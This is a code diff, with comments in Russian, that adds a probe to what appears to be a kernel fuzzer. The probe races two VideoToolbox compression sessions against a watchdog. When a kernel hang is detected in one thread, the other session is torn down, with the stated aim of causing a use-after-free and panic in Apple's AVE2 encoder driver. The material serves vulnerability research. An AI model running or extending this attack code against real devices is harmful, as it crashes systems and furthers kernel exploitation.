@@ -43656,6 +43656,167 @@ static void p_bq83(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq85 — v242: TEARDOWN-ВО-ВРЕМЯ-HANG → UAF (§233: 4× 99-с kernel hang).
+// Механика: reconf-шторм (как p_bq83) ловит kernel hang (RPCTimeout 99с).
+// Когда поток A застревает (encode > HANG_MS), поток B немедленно
+// делает VTCompressionSessionInvalidate СВОЕЙ сессии: kernel Close для B
+// обрабатывается пока путь A завис → ядро может освободить SVE/DPB/CHM,
+// на которые A всё ещё ссылается → UAF → panic.
+// Режимы: FUZZ_BQ85_N=<циклы> (default 50), FUZZ_BQ85_FRAMES=<кадры> (10),
+//   FUZZ_BQ85_HANG_MS=<порог мс> (3000), FUZZ_BQ85_W/H (1280/720).
+static void *bq85_storm(void *arg);
+
+typedef struct {
+    int tid;
+    int ncycles, frames, w, h;
+    int hang_ms;
+    bq83_ctx *ctx;
+    VTCompressionSessionRef session;
+    volatile uint64_t last_heartbeat;  // обновляется ПЕРЕД каждой операцией
+    volatile int hung;       // поток застрял (heartbeat > hang_ms)
+    volatile int kill_now;   // сигнал: немедленно invalidate
+    volatile int cycle;
+    volatile int teardowns_during_hang;
+} bq85_thr;
+
+static uint64_t bq85_now_ns(void) {
+    return clock_gettime_nsec_np(CLOCK_UPTIME_RAW);
+}
+
+static void *bq85_storm(void *arg) {
+    bq85_thr *t = (bq85_thr *)arg;
+    bq83_ctx *c = t->ctx;
+    bool le = false;
+    for (int cy = 0; cy < t->ncycles; cy++) {
+        t->cycle = cy;
+        t->hung = 0;
+        t->kill_now = 0;
+        OSStatus st = bq83_create(&t->session, t->w, t->h, c);
+        if (st != noErr) {
+            usleep(200000);
+            continue;
+        }
+        bq83_apply_mctf(t->session, 12, cy, 0, cy < 1);
+        bq83_setnum(t->session, CFSTR("RealTime"), 1);
+        bq83_setnum(t->session, CFSTR("AverageBitRate"), 700000);
+        bq83_setnum(t->session, CFSTR("MaxKeyFrameInterval"), 3);
+        int encoded = 0;
+        for (int f = 0; f < t->frames; f++) {
+            // проверка: нас просят убить (сосед застрял)
+            if (t->kill_now) {
+                LOG("[bq85] t%d c%d: KILL-ВО-ВРЕМЯ-ПОЛЁТА @frame %d!",
+                    t->tid, cy, f);
+                break;
+            }
+            // reconf-шторм: структурные свойства mid-stream.
+            // HEARTBEAT перед КАЖДОЙ операцией — watchdog видит hang
+            // В РЕАЛЬНОМ ВРЕМЕНИ (не после завершения!)
+            if ((f & 1) == 0) {
+                t->last_heartbeat = bq85_now_ns();
+                bq83_setnum(t->session, CFSTR("MaxKeyFrameInterval"),
+                            (f & 2) ? 3 : 30);
+                t->last_heartbeat = bq85_now_ns();
+                bq83_setnum(t->session, CFSTR("NumberOfTemporalLayers"),
+                            (f & 4) ? 1 : 2);
+                t->last_heartbeat = bq85_now_ns();
+                bq83_setnum(t->session, CFSTR("AverageBitRate"),
+                            300000 + (f % 5) * 200000);
+                t->last_heartbeat = bq85_now_ns();
+            }
+            t->last_heartbeat = bq85_now_ns();
+            if (bq83_encode_one(t->session, t->w, t->h, f, cy, &le, 0)
+                == noErr) {
+                encoded++;
+                c->inflight++;
+            }
+            t->last_heartbeat = bq85_now_ns();
+        }
+        // TEARDOWN mid-flight: тоже время — hang живёт и здесь!
+        uint64_t ti0 = clock_gettime_nsec_np(CLOCK_UPTIME_RAW);
+        VTCompressionSessionInvalidate(t->session);
+        uint64_t ti1 = clock_gettime_nsec_np(CLOCK_UPTIME_RAW);
+        if ((ti1 - ti0) / 1000000ULL > (uint64_t)t->hang_ms) {
+            LOG("[bq85] t%d c%d: INVALIDATE ЗАСТРЯЛ %lld мс!",
+                t->tid, cy, (long long)((ti1 - ti0) / 1000000ULL));
+        }
+        CFRelease(t->session);
+        t->session = NULL;
+        if ((cy % 10) == 0 || cy == t->ncycles - 1)
+            LOG("[bq85] t%d c%d/%d enc=%d done=%d errs=%d infl=%d",
+                t->tid, cy + 1, t->ncycles, encoded, c->done, c->errs,
+                c->inflight);
+        usleep(3000);
+    }
+    return NULL;
+}
+
+// Монитор: heartbeat-детектор — если поток не стучался > hang_ms,
+// он СЕЙЧАС в kernel hang → соседу kill_now → teardown ВРЕМЯ hang.
+static void *bq85_watchdog(void *arg) {
+    bq85_thr *thrs = (bq85_thr *)arg;   // [2]
+    for (;;) {
+        usleep(10000);   // 10мс опрос
+        uint64_t now = bq85_now_ns();
+        for (int i = 0; i < 2; i++) {
+            int other = 1 - i;
+            uint64_t hb = thrs[i].last_heartbeat;
+            if (hb && (now - hb) / 1000000ULL >
+                    (uint64_t)thrs[i].hang_ms) {
+                thrs[i].hung = 1;
+                if (thrs[other].session && !thrs[other].kill_now) {
+                    thrs[other].kill_now = 1;
+                    thrs[i].teardowns_during_hang++;
+                    LOG("[bq85] watchdog: t%d HUNG (%lldмс без heartbeat) "
+                        "→ KILL t%d (teardown соседа ВО ВРЕМЯ kernel "
+                        "hang!)", i,
+                        (long long)((now - hb) / 1000000ULL), other);
+                }
+            }
+        }
+    }
+    return NULL;
+}
+
+static void p_bq85(void) {
+    LOG("[bq85] v242: teardown-во-время-hang → UAF (§233: 99с hang)");
+    fsync(fileno(stderr));
+    int ncycles = getenv("FUZZ_BQ85_N") ? atoi(getenv("FUZZ_BQ85_N")) : 50;
+    int frames = getenv("FUZZ_BQ85_FRAMES") ? atoi(getenv("FUZZ_BQ85_FRAMES")) : 10;
+    int w = getenv("FUZZ_BQ85_W") ? atoi(getenv("FUZZ_BQ85_W")) : 1280;
+    int h = getenv("FUZZ_BQ85_H") ? atoi(getenv("FUZZ_BQ85_H")) : 720;
+    int hang_ms = getenv("FUZZ_BQ85_HANG_MS") ? atoi(getenv("FUZZ_BQ85_HANG_MS")) : 3000;
+    LOG("[bq85] n=%d frames=%d %dx%d hang_ms=%d", ncycles, frames, w, h,
+        hang_ms);
+
+    bq83_ctx *c = calloc(1, sizeof(*c));
+    c->sem = dispatch_semaphore_create(0);
+    bq85_thr t[2] = {0};
+    for (int i = 0; i < 2; i++) {
+        t[i].tid = i;
+        t[i].ncycles = ncycles;
+        t[i].frames = frames;
+        t[i].w = w;
+        t[i].h = h;
+        t[i].hang_ms = hang_ms;
+        t[i].ctx = c;
+        t[i].session = NULL;
+    }
+    pthread_t th[2], wd;
+    pthread_create(&wd, NULL, bq85_watchdog, t);
+    for (int i = 0; i < 2; i++)
+        pthread_create(&th[i], NULL, bq85_storm, &t[i]);
+    for (int i = 0; i < 2; i++)
+        pthread_join(th[i], NULL);
+    pthread_cancel(wd);
+    for (int i = 0; i < 100 && c->inflight > 0; i++)
+        usleep(100000);
+    LOG("[bq85] ИТОГ: done=%d errs=%d sbs=%d infl=%d hang-teardowns "
+        "t0=%d t1=%d", c->done, c->errs, c->sbs, c->inflight,
+        t[0].teardowns_during_hang, t[1].teardowns_during_hang);
+    LOG("[bq85] (panic = ушли в ребут)");
+    fsync(fileno(stderr));
+}
+
 // p_bq84 — v240: ПРЯМОЙ IOKit-клиент AppleAVE2Driver. Протокол §233
 // (декомпиляты ave.videoencoder + ave2-кекст): обходим userspace-гейт FIG
 // и говорим с кекстом теми же командами, что и настоящий кодек —
@@ -51701,6 +51862,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ82")) { p_bq82(); LOG("[probe13] bq82-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ83")) { p_bq83(); LOG("[probe13] bq83-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ84")) { p_bq84(); LOG("[probe13] bq84-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ85")) { p_bq85(); LOG("[probe13] bq85-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
